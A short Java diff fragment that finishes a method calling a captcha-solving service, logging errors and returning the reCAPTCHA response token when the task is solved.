+          DebugHelper.out("API v2 send failed. " + api.getErrorMessage(), DebugHelper.Type.ERROR);
+      } else if (!api.waitForResult()) {
+          DebugHelper.out("Could not solve the captcha.", DebugHelper.Type.ERROR);
+      } else {
+          DebugHelper.out("Result: " + api.getTaskSolution().getGRecaptchaResponse(), DebugHelper.Type.SUCCESS);
+          return api.getTaskSolution().getGRecaptchaResponse();
+      }
+      return null;
   }
     
 }
